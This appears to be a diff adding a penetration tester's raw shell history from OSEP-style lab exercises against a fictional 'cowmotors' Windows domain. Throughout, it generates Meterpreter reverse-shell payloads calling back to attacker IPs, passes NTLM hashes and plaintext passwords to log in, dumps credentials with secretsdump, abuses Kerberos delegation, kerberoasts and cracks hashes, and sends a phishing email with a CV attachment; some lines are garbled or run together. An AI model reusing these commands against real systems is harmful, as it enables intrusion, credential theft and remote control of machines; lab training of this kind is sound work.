+impacket-mssqlclient web01\$@172.16.144.223
+mssqlpwner -hashes ':74d72d13c16ade7d649144526253c6bc' 'web01\$'@172.16.144.223 -windows-auth interactive\
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.240 lport=443 exitfunc=thread -f Csharp
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.45.240 lport=443 exitfunc=thread -f Csharp
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.240 lport=443 exitfunc=thread -f Csharp\
+
+ping 10.10.104.10
+ping scrm.muxuanwangluo.com
+cd lab
+mkdir db
+cd lab7/web
+cd ../lab7/web
+rm rev.exe
+mv ProcessInjection.exe rev.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.240 LPORT=443 prependfork=true -f exe -t 300 -e x64/xor_dynamic -o shell.exe
+cd bd
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.240 LPORT=443 EXITFUNC=thread -f exe -o shell.exe
+impacket-mssqlclient web01\$@172.16.144.223 -hashes ':ba3a636ebcaa8fc1752cc4ea4d90645f' -windows-auth
+impacket-mssqlclient web01\$@172.16.144.223 -hashes ':74d72d13c16ade7d649144526253c6bc' -windows-auth
+impacket-mssqlclient web01\$@172.16.144.223 -hashes '00000000000000000000000000000000:4961266973c0a9ba2718b963943819e9' -windows-auth
+cd osep/lab7
+cd osep
+pyt
+cp amsibypass.ps1 ../db
+cd ../db
+nmap 10.10.75.10
+rm plugin.zip
+vim plugin.php
+zip plugin.zip ./plugin.php
+cd ../lab7/db
+cat plugin.php
+impacket-mssqlclient web01\$@172.16.115.223 -hashes '00000000000000000000000000000000:4961266973c0a9ba2718b963943819e9' -windows-auth\
+
+impacket-mssqlclient web01\$@172.16.115.223 -windows-auth
+impacket-mssqlclient administrator@172.16.115.225 -hashes '00000000000000000000000000000000:0ba93ecdf968132e78d3a21ab078b3fa' -windows-auth
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 192.115.201 -u "Application - Curriculum Vitae" -m "Attached" -a CV.doc -vvv
+cd OSEP/lab7/web
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 168.192.115.201 -u "Application - Curriculum Vitae" -m "Attached" -a CV.doc -vvv
+wget https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
+php wp-cli.phar --info
+sudo mv wp-cli.phar /usr/local/bin/wp\
+
+sudo chmod +x /usr/local/bin/wp
+wp -info
+wp user hash-password "abc123
+wp --info
+wp user --hep
+wp --help
+wp user --help
+wp user hash-password
+sudo ip route add 10.10.75.0/24 dev ligolo2
+ping 10.10.75.10
+nc
+exi
+rm * krb5cc_*
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web01/krb5cc_1501201132_dtW4q0
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass -dc-ip 172.16.115.101  'cowmotors-int.com/Terence.Ford:'\
+
+impacket-rbcd -delegate-from 'myComputer$' -delegate-to 'WEB01$' -action 'write' -k -no-pass COWMOTORS-INT.COM/terence.ford -dc-ip 172.16.115.101
+proxychains impacket-rbcd -delegate-from 'myComputer$' -delegate-to 'WEB01$' -action 'write' -k -no-pass COWMOTORS-INT.COM/terence.ford -dc-ip 172.16.115.101
+proxychains impacket-addcomputer -computer-name 'myComputer1$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass -dc-ip 172.16.115.101  'cowmotors-int.com/Terence.Ford:'\
+
+proxychains impacket-rbcd -delegate-from 'myComputer1$' -delegate-to 'WEB01$' -action 'write' -k -no-pass COWMOTORS-INT.COM/terence.ford -dc-ip 172.16.115.101
+netexec smb ips --generate-host-file hostfile
+netexec smb ips --generate-hosts-file hostfile
+touch hostfile
+netexec smb
+nxc --version
+netexec smb ips
+netexec smb ips > ./hostfile
+netexec smb ips --generate-hosts-file ./hostfile
+netexec smb ips --append-host ./hostfile
+netexec smb ips --append-host
+ls 0la
+cat ntsvcs
+rm ntsvcs
+rm lsass
+cat hosts.txt
+cat hostfile
+proxychains impacket-rbcd -delegate-from 'myComputer1$' -delegate-to 'WEB01$' -action 'write' -dc-ip 172.16.115.101 -k -no-pass 'COWMOTORS-INT.COM/terence.ford' 
+./chisel
+chmod +x chisel
+./chisel -h
+mkdir web04
+sudo nmap -p- --open -sCV --min-rate=2000 192.168.115.200 -oN nmap-tcp-04.txt -Pn
+smbclient -L 192.168.115.200
+gobuster dir -u http://http://web04.cowmotors.com 
+gobuster dir -u http://http://web04.cowmotors.com  -w /usr/share/seclists/Discovery/Web-Content/common.txt 2>/dev/null
+gobuster dirp://http://web04.cowmotors.com  -w /usr/share/seclists/Discovery/Web-Content/common.txt 2>/dev/null
+gobuster dir -u http://web04.cowmotors.com /usr/share/seclists/Discovery/Web-Content/common.txt 2xt 2>/dev/null \
+
+gobuster dir -u http://web04.cowmotors.com -w /usr/share/seclists/Discovery/Web-Content/common.txt  2>/dev/null 
+gobuster dir -u http://web04.cowmotors.com/home -w /usr/share/seclists/Discovery/Web-Content/common.txt  2>/dev/null
+gobuster dir -u http://web04.cowmotors.com/home/survey -w /usr/share/seclists/Discovery/Web-Content/common.txt  2>/dev/null \
+
+gobuster dir -u http://web04.cowmotors.com/home/survey/ -w /usr/share/seclists/Discovery/Web-Content/common.txt  2>/dev/null \
+
+gobuster dir -u http://web04.cowmotors.com/home/ -w /usr/share/seclists/Discovery/Web-Content/common.txt  2>/dev/null \
+
+nikto web04.cowmotors.com
+nikto http://web04.cowmotors.com
+nikto -url web04.cowmotors.com
+cd db
+cp run.ps1 ../../code
+cd ../../code
+mv run.ps1 OSEP
+cd OSE
+git commit -m "submit the run.ps1"
+cd web
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 192.168.115.201 -u "Application - Curriculum Vitae" -m "Attached" -a CV.doc -vvv
+sudo ip route add 172.16.115.0/24 dev ligolo
+xfreerdp /v:192.168.115.80 /u:Administrator /p:lab /cert-ignore
+xfreerdp /v:192.168.167.80 /u:Administrator /p:lab /cert-ignore
+cp /home/parallels/OSEP/lab7/client/rockyou.txt  ~/OSEP/lab7/web04
+evil-winrm -i 192.168.167.200 -u svc_file -p August25\
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.243 LPORT=4444 EXITFUNC=thread -f ps1
+cd web01
+cd ../web
+cp amsibypass.ps1 ../web04
+cd ../web04
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.229 LPORT=4444 EXITFUNC=thread -f ps1\
+
+sudo ip route add 172.16.167.0/24 dev ligolo
+sudo nmap -p1-5000 -sT --min-rate=2000 172.16.167.210 -oN nmap-tcp.txt -Pn
+smbclient -L 172.16.167.210
+impacket-GetUserSPNs -dc-ip 172.16.167.100  -request -outputfile hashes.kerberoast COWMOTORS.com/svc_web
+impacket-GetNPUsers COWMOTORS.com/svc_web -no-pass -dc-ip 172.16.167.100 
+impacket-GetUserSPNs -request -dc-ip 172.16.167.100 COWMOTORS.com/svc_web
+sudo hashcat -m 13100 hashes.kerberoast
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+vim run.ps1
+sudo ip route add 172.16.167.0/24 dev ligolo\
+
+sudo vim 
+bloodhound-python -d COWMOTORS.com -c all -u svc_file -p August25 -ns 172.16.167.100 --dns-tcp
+find / -name getST.py 2>/dev/null
+cp /home/parallels/OSEP/lab5/ST/getST.py .
+python3 getST.py -dc-ip 172.16.167.100 -impersonate administrator -spn cifs/file02.cowmotors.com 'cowmotors.com/svc_file'
+impacket-psexec administrator@file02.cowmotors-int.com -k -no-pass -target-ip 172.16.167.100
+impacket-psexec administrator@file02.cowmotors-int.com -k -no-pass 
+impacket-psexec administrator@file02.cowmotors.com -k -no-pass 
+python3 getST.py -dc-ip 172.16.167.100 -impersonate administrator -spn cifs/file02 'cowmotors.com/svc_file'\
+
+impacket-psexec administrator@file02.cowmotors.com@cowmotors.com -k -no-pass
+impacket-psexec administrator@file02 -k -no-pass
+getST.py -dc-ip 172.16.167.100 -impersonate administrator -spn cifs/file02.cowmotors.com 'cowmotors.com/svc_file'\
+
+python3 getST.py -dc-ip 172.16.167.100 -impersonate administrator -spn cifs/file02 'cowmotors.com/svc_file' -k -no-pass\
+
+python3 getST.py -dc-ip 172.16.167.100 -impersonate administrator -spn cifs/file02.cowmotors.com 'cowmotors.com/svc_file' -k -no-pass\
+
+nxc smb file02.cowmotors.com --use-kcache
+find / -name Invoke-RunasCs.ps1 2>/dev/null
+cp /home/parallels/OSEP/lab4/Invoke-RunasCs.ps1 .
+find / -name atexec.py  2>/dev/null
+cp /usr/share/doc/python3-impacket/examples/atexec.py .
+python3 atexec.py -k -no-pass -dc-ip 172.16.167.100 file02.cowmotors.com\
+
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web04/administrator@cifs_file02@COWMOTORS.COM.ccache
+find / -name getTGT.py  2>/dev/null
+cp /usr/share/doc/python3-impacket/examples/getTGT.py .
+python3 getTGT.py cowmotors.com/svc_file:August25 -dc-ip 172.16.167.100\
+
+KRB5CCNAME=svc_file.ccache\
+
+python3 getST.py -spn cifs/FILE02 -impersonate administrator cowmotors.com/svc_file -k -no-pass -dc-ip 172.16.167.100
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web04/administrator@cifs_FILE02@COWMOTORS.COM.ccache
+python3 atexec.py -k -no-pass -dc-ip 172.16.167.100 file02.cowmotors.com "whoami"\
+
+impacket-psexec administrator@web01.cowmotors-int.com -k -no-pass -target-ip 172.16.205.221\
+
+impacket-psexec administrator@file02 -k -no-pass  -dc-ip 172.16.167.100
+impacket-psexec administrator@file02.cowmotors.com -k -no-pass  -dc-ip 172.16.167.100
+python3 getST.py -spn cifs/FILE02.cowmotors.com -impersonate administrator cowmotors.com/svc_file -k -no-pass -dc-ip 172.16.167.100\
+
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web04/svc_file.ccache
+python3 getST.py -spn cifs/FILE02.cowmotors.com -impersonate administrator cowmotors.com/svc_file -k -no-pass -dc-ip 172.16.167.100
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web04/administrator@cifs_FILE02.cowmotors.com@COWMOTORS.COM.ccache
+impacket-psexec administrator@file02.cowmotors.com -k -no-pass  -dc-ip 172.16.167.100\
+
+python3 getST.py -spn 'cifs/file02.cowmotors.com' -impersonate 'admin' -altservice 'cifs' 'cowmotors.com/svc_file'\
+
+python3 getST.py -dc-ip 172.16.167.100 -impersonate administrator -spn cifs/file02.cowmotors.com 'cowmotors.com/svc_file'\
+
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web04/administrator@cifs_file02.cowmotors.com@COWMOTORS.COM.ccache
+mv administrator@cifs_file02.cowmotors.com@COWMOTORS.COM.ccache ticket.ccache
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web04/ticket.ccache
+file ticket.ccache
+impacket-psexec administrator@file02.cowmotors.com -k -no-pass
+python3 atexec.py -k -no-pass -dc-ip 172.16.167.100 file02.cowmotors.com "whoami"
+python3 atexec.py -k -no-pass -dc-ip 172.16.167.100 file02.cowmotors.com "ping 192.168.45.229"
+rm administrator@cifs_FILE02.cowmotors.com@COWMOTORS.COM.ccache 
+rm administrator@cifs_FILE02@COWMOTORS.COM.ccache 
+rm administrator@cifs_file02@COWMOTORS.COM.ccache 
+ping 172.16.167.210
+nxc smb -h
+cat ips
+vim ips
+nxc smb ips --gen-relay-list
+nxc smb ips 
+nxc smb ips --gen-relay-list hosts-file
+cat hosts-file
+sudo apt install software-properties-common apt-transport-https
+wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg â€ƒ³dearmor > packages.microsoft.gpg
+wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg
+sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/trusted.gpg.d/\
+
+sudo sh -c â€ƒ¸echo â€ƒ¼deb [arch=amd64 signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/vscode stable mainâ€ƒ½ > /etc/apt/sources.list.d/vscode.listâ€ƒ¹\
+
+sudo sh -c 'echo "deb [arch=amd64 signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/vscode stable mainâ€ƒ½ > /etc/apt/sources.list.d/vscode.list'
+sudo sh -c 'echo "deb [arch=amd64 signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/vscode stable main" > /etc/apt/sources.list.d/vscode.list'\
+
+sudo apt install code
+gpg â€ƒ³dearmor > packages.microsoft.gpg
+gpg â€ƒ³dearmor 
+gpg
+$ sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/trusted.gpg.d/\
+
+chmod +x code_1.97.2-1739406006_arm64.deb
+sudo apt install ./code_1.97.2-1739406006_arm64.deb
+ping 192.168.197.200
+shell
+sh
+echo $shell
+echo $sh
+ping https://packages.gitlab.com/gitlab/gitlab-ce/ubuntu/
+cat /etc/apt/sources.list.d/gitlab_gitlab-ce.list
+echo 'deb https://packages.gitlab.com/gitlab/gitlab-ce/ubuntu/ \$(lsb_release -c | awk \'{print \$2}\') main'
+lsb_release -c | awk '{print $2}'
+echo $kali-rolling
+vim etc/apt/sources.list.d/gitlab_gitlab-ce.list
+sudo vim etc/apt/sources.list.d/gitlab_gitlab-ce.list
+cat etc/apt/sources.list.d/gitlab_gitlab-ce.list
+sudo touch /etc/apt/sources.list.d/gitlab_gitlab-ce.list
+sudo apt update\
+
+sudo vim /etc/apt/sources.list.d/gitlab_gitlab-ce.list
+curl https://packages.gitlab.com/gpg.key
+sudo curl https://packages.gitlab.com/gpg.key | sudo apt-key add -
+sudo apt install apt-key
+curl https://packages.gitlab.com/gpg.key | sudo tee /etc/apt/trusted.gpg.d/gitlab.asc
+sudo sh -c 'echo "deb https://packages.gitlab.com/gitlab/gitlab-ce/debian/ bullseye main" > /etc/apt/sources.list.d/gitlab_gitlab-ce.list'
+sudo apt install gitlab-ce
+sudo gitlab-ctl reconfigure
+sudo gitlab-ctl start
+cat ~/.ssh/config
+git -Tvvv git@DEV01
+ping DEV01
+python3 -
+rm svc_file.ccache
+rm ticket.ccache
+cd ../../tools
+ping 172.16.197.60
+impacket-getST -spn CIFS/FILE02 -impersonate administrator cowmotors.com/svc_file:August25
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web04/administrator@CIFS_FILE02@COWMOTORS.COM.ccache
+impacket-psexec target-ip 172.16.197.210 -k -no-pass -dc-ip 172.16.197.100 file02
+ping file02
+nxc smb file02.cowmotors.com --use-kcache\
+
+impacket-psexec administrator@file02 -k -no-pass  -dc-ip 172.16.197.100 -target-ip 172.16.197.100
+impacket-psexec administrator@file02 -k -no-pass  -dc-ip 172.16.197.100 -target-ip 172.16.197.210\
+
+eval "$(ssh-agent -s)"
+cat id_rsa
+ssh-add ./id_rsa
+chmod 600 ./id_rsa
+ping 172.16.167.212
+ssh -T marian.simpson@172.16.197.212
+ssh -Tvvv git@172.16.197.212
+ssh -i ./id_rsa -Tvvv git@172.16.197.212
+git help
+sudo gitlab-rails console
+sudo apt-get update\
+
+sudo apt-get install -y curl openssh-server ca-certificates tzdata perl
+curl https://packages.gitlab.com/gpg.key | sudo apt-key add -
+sudo apt-get install gitlab-ce
+sudo sh -c 'echo "deb https://packages.gitlab.com/gitlab/gitlab-ce/ubuntu/ $(lsb_release -c | awk \'{print $2}\') main" > /etc/apt/sources.list.d/gitlab_gitlab-ce.list'
+sudo sh -c "echo 'deb https://packages.gitlab.com/gitlab/gitlab-ce/ubuntu/ \$(lsb_release -c | awk \'{print \$2}\') main' > /etc/apt/sources.list.d/gitlab_gitlab-ce.list"
+zsh
+nxc smb -u  COWMOTORS.COM\Diane.Clarke -p VYxALZuNAI6L 172.16.197.60
+nxc smb 172.16.197.60 -u COWMOTORS.COM\Diane.Clarke -p VYxALZuNAI6L
+nxc smb 172.16.197.60 -u Diane.Clarke -p VYxALZuNAI6L -d cowmotors.com
+nxc winrm 172.16.197.60 -u Diane.Clarke -p VYxALZuNAI6L -d cowmotors.com
+cd ...
+mkdir client01
+bloodhound-python -d COWMOTORS.com -c all -u Diane.Clarke -p VYxALZuNAI6L -ns 172.16.167.100 --dns-tcp
+bloodhound-python -d COWMOTORS.com -c all -u Diane.Clarke -p VYxALZuNAI6L -ns 172.16.197.100 --dns-tcp
+nxc smb web04 -u administrator -p nR35Q8M7mj+88q -d cowmotors.com
+ping web04.cowmotors.com
+nxc smb 192.168.197.200 -u administrator -p nR35Q8M7mj+88q -d cowmotors.com
+nxc smb 192.168.197.200 -u administrator -p nR35Q8M7mj+88q
+nxc smb 192.168.197.200 -u administrator -p 'nR35Q8M7mj+88q'
+nxc smb 192.168.197.200 -u administrator -p 'nR35Q8M7mj+88q' -d .
+evil-winrm -i 192.168.167.200 -u administrator -p nR35Q8M7mj+88q
+evil-winrm -i 192.168.197.200 -u administrator -p nR35Q8M7mj+88q
+vim id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa marian.simpson@172.16.197.60
+mkdir dev
+cd client
+cd client01
+ssh2john id_rsa > hash
+cat hash
+john hash --wordlist=rockyou.txt
+nxc smb -u administrator -p nR35Q8M7mj+88q 172.16.197.60\
+
+nxc smb 172.16.197.60 -u administrator -p nR35Q8M7mj+88q
+nxc smb 172.16.197.60 -u administrator -p nR35Q8M7mj+88q -d .
+nxc smb 172.16.197.60 -u Sharon.Hudson -p xiek9aaObVMM 
+evil-winrm -i 172.16.197.60 -u Sharon.Hudson -p xiek9aaObVMM
+sudo ip route add 172.16.197.0/24 dev ligolo
+impacket-psexec Sharon.Hudson:'xiek9aaObVMM'@172.16.197.60
+sudo gitlab-ctl stop
+sudo apt-get remove --purge gitlab-ce
+sudo apt-get autoremove --purge
+sudo rm -rf /var/opt/gitlab\
+
+sudo rm -rf /etc/gitlab\
+
+sudo rm -rf /var/log/gitlab
+cd ../../lab7
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.158 LPORT=4444 EXITFUNC=thread -f ps1
+git commit -m "submit the exe"
+git commit -m "submit the exe2"
+git commit -m "submit the exe3"
+git commit -m "submit the exe4"
+git commit -m "submit the exe5"
+git commit -m "submit the exe6"
+git commit -m "submit the exe7"
+git commit -m "submit the exe8"
+git commit -m "submit the exe9"
+git commit -m "submit the exe10"
+git commit -m "submit the exe11"
+git commit -m "submit the exe12"
+git commit -m "submit the exe13"
+git commit -m "modify the index.js"
+nmap dev01
+nmap -sT dev01
+nmap -sT dev01 -A
+nmap -sT 172.16.197.211 -A
+git commit -m "modify the index.js -2"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.158 LPORT=443 EXITFUNC=thread -f ps1
+git commit -m "modify the index.js -3"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.158 LPORT=443 EXITFUNC=thread -f cSharp
+cd ~/OSEP/lab7
+ssh carole.davies@172.16.197.211
+impacket-smbserver share . -smb2support -username "" -password "" -noannounce
+impacket-smbserver -h
+sudo responder -I tun0
+ping http://172.16.197.212
+ping 172.16.197.212
+mkdir dev01
+git -help
+sudo vim ~/.ssh/config
+git clone git@dev01.cowmotors.com:msimpson/monitor.git
+cat ~/.ssh/config  
+cat index.js
+git commit -m "modify the index.js -4"
+ping dev01
+git -Tv git@DEV01
+git -T git@DEV01
+ssh -T git@DEV01\
+
+git commit -m "modify the index.js -5"
+git commit -m "modify the index.js -7"
+git commit -m "modify the index.js -8"
+git commit -m "modify the index.js -10"
+git commit -m "modify the index.js -11"
+cd ../lab7
+sudo ip tuntap add user parallels mode tun ligolo\
+
+sudo ip route add 172.16.244.0/24 dev ligolo
+cd dev01
+impacket-smbserver share . -smb2support -username "" -password ""
+impacket-smbserver share . -smb2support
+rm 20250218010138_BloodHound.zip
+nxc smb 172.16.244.62 -u Rachel.Kennedy -H d7cafc10bdcb3a5de07c0c31be254023 
+evil-winrm -i 172.16.197.62 -u Rachel.Kennedy -H d7cafc10bdcb3a5de07c0c31be254023
+xfreerdp /v:192.168.197.80 /u:Administrator /p:lab /cert-ignore
+code index.js
+xfreerdp /v:192.168.244.80 /u:Administrator /p:lab /cert-ignore
+find / -name LAPSToolkit.ps1  2>/dev/null
+cd ../lab7/web04
+impacket-secretsdump -h
+ping COWMOTORS.com
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy@172.16.244.62 -hashes:d7cafc10bdcb3a5de07c0c31be254023\
+
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy@172.16.244.62 -hashes d7cafc10bdcb3a5de07c0c31be254023\
+
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy@172.16.244.62 -hashes :d7cafc10bdcb3a5de07c0c31be254023\
+
+ping dc01
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy -hashes :d7cafc10bdcb3a5de07c0c31be254023 -target-ip ip 172.16.244.100 -dc-ip 172.16.244.100
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy -hashes :d7cafc10bdcb3a5de07c0c31be254023 -target-ip 172.16.244.100 -dc-ip 172.16.244.100\
+
+cd OSEP/lab7
+cd ../lab7/client
+mkdir dc
+cd /home/parallels/OSEP/lab3/rockyou.txt dc
+cp /home/parallels/OSEP/lab3/rockyou.txt dc
+hashcat -m 2100 hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\
+
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy -hashes :e59f7d983ed6c88578a0dc20546d2b68 -target-ip 172.16.244.100 -dc-ip 172.16.244.100
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy -hashes :e59f7d983ed6c88578a0dc20546d2b68 -target-ip 172.16.244.100 -dc-ip 172.16.24impacket-secretsdump COWMOTORS.com/Rachel.Kennedy -hashes :e59f7d983ed6c88578a0dc20546d2b68 -target-ip 172.16.244.100\
+4.100
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy -hashes :e59f7d983ed6c88578a0dc20546d2b68 -target-ip 172.16.244.100\
+
+secretsdump.py COWMOTORS.com/Rachel.Kennedy@172.16.244.100 -hashes:d7cafc10bdcb3a5de07c0c31be254023\
+
+y
+evil-winrm -i 172.16.244.62 -u Rachel.Kennedy -H d7cafc10bdcb3a5de07c0c31be254023
+cd OSEP/lab7/web04
+cd ssh -T git@DEV01
+sudo ip route add 172.16.244.0/24 dev ligolo\
+
+cd OSEP/lab7/dev
+cd monitor
+ssh -T git@DEV01
+git commit -m "modify the index.js -01"
+git commit -m "modify the index.js -02"
+whoami
+cd lab7
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.42.158 LPORT=443 EXITFUNC=thread -f cSharp
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.152 LPORT=443 EXITFUNC=thread -f cSharp
+nxc smb -i 172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd
+nxc smb  172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd\
+
+ping 172.16.172.54
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.42.158 LPORT=4444 EXITFUNC=thread -f ps1
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.152 LPORT=4444 EXITFUNC=thread -f ps1
+cd dev
+cd web04
+nxc smb 172.16.172.54 -u Gary.Gibson -H ff9334a312d10406efed947d44e9a9b3
+nxc smb 172.16.172.54 -u Gary.Gibson -H ff9334a312d10406efed947d44e9a9b3 -d .
+nxc smb 172.16.172.54 -u Gary.Gibson -H ff9334a312d10406efed947d44e9a9b3 -d cowmotors-lab.com
+nxc smb 172.16.172.102 -u Gary.Gibson -H ff9334a312d10406efed947d44e9a9b3 -d cowmotors-lab.com
+nxc smb 172.16.172.54 -u Gary.Gibson -H ff9334a312d10406efed947d44e9a9b3 -d cowmotors.com
+ping dc03
+nxc smb 172.16.172.102 -u Dawn.Jones -H 6059a6af25a58df553347bbeb7f35166
+evil-winrm -i 172.16.172.102 -u Dawn.Jones  -H 6059a6af25a58df553347bbeb7f35166
+sudo bloodhound
+IP A
+xfreerdp /v:192.168.172.80 /u:Administrator /p:lab /cert-ignore
+cd OSEP/
+impacket-psexec -hashes 00000000000000000000000000000000:6c83c25195333159907bc75acd7a29f4 administrator@172.16.172.100
+ping 172.16.172.100
+nxc smb  172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd
+nxc smb  172.16.172.54 -u Administrator -H 6c83c25195333159907bc75acd7a29f4
+nxc smb  172.16.172.54 -u Administrator -H 6c83c25195333159907bc75acd7a29f4 -d .
+nxc smb  172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd -d .
+cd ../lab7/
+cd dc
+mkdir cowmotors.com
+cd cowmotors.com
+bloodhound-python -d COWMOTORS.com -c all -u Rachel.Kennedy --hashes:d7cafc10bdcb3a5de07c0c31be254023 -ns 172.16.172.100 --dns-tcp
+ping cowmotors.com
+bloodhound-python -d COWMOTORS.com -c all -u Rachel.Kennedy --ha shes:d7cafc10bdcb3a5de07c0c31be254023 -ns 172.16.172.100 --dns-tcp
+bloodhound-python -d COWMOTORS.com -c all -u Rachel.Kennedy --ha shes:d7cafc10bdcb3a5de07c0c31be254023 -ns 172.16.172
+bloodhound-python -d COWMOTORS.com -c all -u Rachel.Kennedy --hashes :d7cafc10bdcb3a5de07c0c31be254023 -ns 172.16.172.100 --dns-tcp\
+
+bloodhound-python -d COWMOTORS-lab.com -c all -u Rachel.Kennedy --hashes :d7cafc10bdcb3a5de07c0c31be254023 -ns 172.16.172.102 --dns-tcp
+mkdir cowmotors-lab.com
+cd cowmotors-lab.com
+bloodhound-python -d COWMOTORS-lab.com -c all -u Rachel.Kennedy --hashes :d7cafc10bdcb3a5de07c0c31be254023 -ns 172.16.172.100  --dns-tcp
+evil-winrm -i 172.16.244.100 -u Administrator -H 6c83c25195333159907bc75acd7a29f4
+evil-winrm -i 172.16.172.100 -u Administrator -H 6c83c25195333159907bc75acd7a29f4
+sudo ip route add 172.16.172.0/24 dev ligolo
+ping dc01.cowmotors.com
+ping COWMOTORS-lab.com
+nxc smb 172.16.172.54 -u Rachel.Kennedy --hashes :d7cafc10bdcb3a5de07c0c31be254023
+nxc smb 172.16.172.54 -u Rachel.Kennedy -H d7cafc10bdcb3a5de07c0c31be254023
+nxc nxc 172.16.172.54 -u a-uinistrator -H 7-Hced4a873c00548a350ce6daf753bd -d .
+nxc smb 172.16.172.54 -u a-uinistrator -H 7-Hced4a873c00548a350ce6daf753bd -d .
+nxc smb 172.16.172.54 -u administrator -H 756ced4a873c00548a350ce6daf753bd\
+
+impacket-secretsdump COWMOTORS-lab.com/Rachel.Kennedy@172.16.244.100 -hashes :d7cafc10bdcb3a5de07c0c31be254023\
+
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy@172.16.244.100 -hashes :d7cafc10bdcb3a5de07c0c31be254023\
+
+impacket-secretsdump COWMOTORS.com/Rachel.Kennedy@172.16.172.100 -hashes :d7cafc10bdcb3a5de07c0c31be254023
+nxc smb 172.16.172.54 -u Patrick.Gibson -H 8fe914c2a09c571ca305f45a2ed7f868 -d cowmotors.com
+nxc smb 172.16.172.54 -u administrator -H 756ced4a873c00548a350ce6daf753bd -d .
+evil-winrm -i 172.16.172.54 -u Patrick.Gibson -H 8fe914c2a09c571ca305f45a2ed7f868
+cd OSEP/lab7/ 
+nxc smb -i 172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bdnxc smb -i 172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bdnxc smb -i 172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bdnxc smb -i 172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bdnxc smb -i 172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd
+cccccllllleeeeeaaaaarrrrr
+nxc smb  172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd\
+nxc smb  172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd\
+nxc smb  172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd\
+nxc smb  172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd\
+nxc smb  172.16.172.54 -u Administrator -H 756ced4a873c00548a350ce6daf753bd\
+
+nxc smb  172.16.172.54 -u Administrator -H 6c83c25195333159907bc75acd7a29f4nxc smb  172.16.172.54 -u Administrator -H 6c83c25195333159907bc75acd7a29f4nxc smb  172.16.172.54 -u Administrator -H 6c83c25195333159907bc75acd7a29f4nxc smb  172.16.172.54 -u Administrator -H 6c83c25195333159907bc75acd7a29f4nxc smb  172.16.172.54 -u Administrator -H 6c83c25195333159907bc75acd7a29f4
+pppppiiiiinnnnnggggg     111117777722222.....1111166666.....111117777722222.....5555544444
+gobuster dir -u http://10.10.110.250 -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '403,404' 2>/dev/null
+git clone https://github.com/21y4d/nmapAutomator.git
+python3 -m pip install -r requirements.txt
+sudo python3 -m pip install -r requirements.txt
+chmod +x nmapAutomator.sh
+./nmapAutomator.sh 10.10.110/24
+./nmapAutomator.sh 10.10.110.0/24
+./nmapAutomator.sh -H 10.10.110.0/24
+./nmapAutomator.sh --host 10.10.110.0/24
+./nmapAutomator.sh
+./nmapAutomator.sh -h
+./nmapAutomator.sh Network -h
+./nmapAutomator.sh 10.10.110.0/24 -t Port
+./nmapAutomator.sh -H 10.10.110.0/24 -t Port
